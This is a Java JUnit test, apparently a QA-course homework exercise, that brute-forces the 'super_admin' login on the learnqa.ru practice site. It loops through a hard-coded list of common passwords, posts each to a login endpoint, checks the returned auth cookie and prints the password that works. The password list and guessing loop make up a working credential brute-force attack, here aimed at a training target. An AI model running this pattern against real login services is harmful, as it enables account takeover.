import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class Ex9 {
    @Test
    public void testRestAssured(){

        String LoginURL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String CheckAuthURL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String Login = "super_admin";

        List ListPass = new ArrayList();
        ListPass.add("password");
        ListPass.add("password");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("123456");
        ListPass.add("password");
        ListPass.add("password");
        ListPass.add("password");
        ListPass.add("password");
        ListPass.add("password");
        ListPass.add("password");
        ListPass.add("123456789");
        ListPass.add("12345678");
        ListPass.add("12345678");
        ListPass.add("12345678");
        ListPass.add("12345");
        ListPass.add("12345678");
        ListPass.add("12345");
        ListPass.add("12345678");
        ListPass.add("123456789");
        ListPass.add("qwerty");
        ListPass.add("qwerty");
        ListPass.add("abc123");
        ListPass.add("qwerty");
        ListPass.add("12345678");
        ListPass.add("qwerty");
        ListPass.add("12345678");
        ListPass.add("qwerty");
        ListPass.add("12345678");
        ListPass.add("password");
        ListPass.add("abc123");
        ListPass.add("qwerty");
        ListPass.add("abc123");
        ListPass.add("qwerty");
        ListPass.add("12345");
        ListPass.add("football");
        ListPass.add("12345");
        ListPass.add("12345");
        ListPass.add("1234567");
        ListPass.add("monkey");
        ListPass.add("monkey");
        ListPass.add("123456789");
        ListPass.add("123456789");
        ListPass.add("123456789");
        ListPass.add("qwerty");
        ListPass.add("123456789");
        ListPass.add("111111");
        ListPass.add("12345678");
        ListPass.add("1234567");
        ListPass.add("letmein");
        ListPass.add("111111");
        ListPass.add("1234");
        ListPass.add("football");
        ListPass.add("1234567890");
        ListPass.add("letmein");
        ListPass.add("1234567");
        ListPass.add("12345");
        ListPass.add("letmein");
        ListPass.add("dragon");
        ListPass.add("1234567");
        ListPass.add("baseball");
        ListPass.add("1234");
        ListPass.add("1234567");
        ListPass.add("1234567");
        ListPass.add("sunshine");
        ListPass.add("iloveyou");
        ListPass.add("trustno1");
        ListPass.add("111111");
        ListPass.add("iloveyou");
        ListPass.add("dragon");
        ListPass.add("1234567");
        ListPass.add("princess");
        ListPass.add("football");
        ListPass.add("qwerty");
        ListPass.add("111111");
        ListPass.add("dragon");
        ListPass.add("baseball");
        ListPass.add("adobe123[a]");
        ListPass.add("football");
        ListPass.add("baseball");
        ListPass.add("1234");
        ListPass.add("iloveyou");
        ListPass.add("iloveyou");
        ListPass.add("123123");
        ListPass.add("baseball");
        ListPass.add("iloveyou");
        ListPass.add("123123");
        ListPass.add("1234567");
        ListPass.add("welcome");
        ListPass.add("login");
        ListPass.add("admin");
        ListPass.add("princess");
        ListPass.add("abc123");
        ListPass.add("111111");
        ListPass.add("trustno1");
        ListPass.add("admin");
        ListPass.add("monkey");
        ListPass.add("1234567890");
        ListPass.add("welcome");
        ListPass.add("welcome");
        ListPass.add("admin");
        ListPass.add("qwerty123");
        ListPass.add("iloveyou");
        ListPass.add("1234567");
        ListPass.add("1234567890");
        ListPass.add("letmein");
        ListPass.add("abc123");
        ListPass.add("solo");
        ListPass.add("monkey");
        ListPass.add("welcome");
        ListPass.add("1q2w3e4r");
        ListPass.add("master");
        ListPass.add("sunshine");
        ListPass.add("letmein");
        ListPass.add("abc123");
        ListPass.add("111111");
        ListPass.add("abc123");
        ListPass.add("login");
        ListPass.add("666666");
        ListPass.add("admin");
        ListPass.add("sunshine");
        ListPass.add("master");
        ListPass.add("photoshop[a]");
        ListPass.add("111111");
        ListPass.add("1qaz2wsx");
        ListPass.add("admin");
        ListPass.add("abc123");
        ListPass.add("abc123");
        ListPass.add("qwertyuiop");
        ListPass.add("ashley");
        ListPass.add("123123");
        ListPass.add("1234");
        ListPass.add("mustang");
        ListPass.add("dragon");
        ListPass.add("121212");
        ListPass.add("starwars");
        ListPass.add("football");
        ListPass.add("654321");
        ListPass.add("bailey");
        ListPass.add("welcome");
        ListPass.add("monkey");
        ListPass.add("access");
        ListPass.add("master");
        ListPass.add("flower");
        ListPass.add("123123");
        ListPass.add("123123");
        ListPass.add("555555");
        ListPass.add("passw0rd");
        ListPass.add("shadow");
        ListPass.add("shadow");
        ListPass.add("shadow");
        ListPass.add("monkey");
        ListPass.add("passw0rd");
        ListPass.add("dragon");
        ListPass.add("monkey");
        ListPass.add("lovely");
        ListPass.add("shadow");
        ListPass.add("ashley");
        ListPass.add("sunshine");
        ListPass.add("master");
        ListPass.add("letmein");
        ListPass.add("dragon");
        ListPass.add("passw0rd");
        ListPass.add("654321");
        ListPass.add("7777777");
        ListPass.add("123123");
        ListPass.add("football");
        ListPass.add("12345");
        ListPass.add("michael");
        ListPass.add("login");
        ListPass.add("sunshine");
        ListPass.add("master");
        ListPass.add("!@#$%^&*");
        ListPass.add("welcome");
        ListPass.add("654321");
        ListPass.add("jesus");
        ListPass.add("password1");
        ListPass.add("superman");
        ListPass.add("princess");
        ListPass.add("master");
        ListPass.add("hello");
        ListPass.add("charlie");
        ListPass.add("888888");
        ListPass.add("superman");
        ListPass.add("michael");
        ListPass.add("princess");
        ListPass.add("696969");
        ListPass.add("qwertyuiop");
        ListPass.add("hottie");
        ListPass.add("freedom");
        ListPass.add("aa123456");
        ListPass.add("princess");
        ListPass.add("qazwsx");
        ListPass.add("ninja");
        ListPass.add("azerty");
        ListPass.add("123123");
        ListPass.add("solo");
        ListPass.add("loveme");
        ListPass.add("whatever");
        ListPass.add("donald");
        ListPass.add("dragon");
        ListPass.add("michael");
        ListPass.add("mustang");
        ListPass.add("trustno1");
        ListPass.add("batman");
        ListPass.add("passw0rd");
        ListPass.add("zaq1zaq1");
        ListPass.add("qazwsx");
        ListPass.add("password1");
        ListPass.add("password1");
        ListPass.add("Football");
        ListPass.add("password1");
        ListPass.add("000000");
        ListPass.add("trustno1");
        ListPass.add("starwars");
        ListPass.add("password1");
        ListPass.add("trustno1");
        ListPass.add("qwerty123");
        ListPass.add("123qwe");



        for (int i = 0; i <= ListPass.size()-1; i++) {
            String pass = (String) ListPass.get(i);
            Map<String, String> data = new HashMap<>();
            data.put("login", Login);
            data.put("password", pass);
            Response testLoginPair = RestAssured  //Получаем куки для пар
                    .given()
                    .body(data)
                    .when()
                    .post(LoginURL)
                    .andReturn();
            String responseCookie = testLoginPair.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie",responseCookie);


            Response checkCookie = RestAssured //Проверяем куки
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post(CheckAuthURL)
                    .andReturn();
            String status = checkCookie.getBody().asString();


                if ("You are authorized".equals(status)){
                System.out.println(status+" TRUE PASS "+ pass);
                break;
            }

        }

    }
}
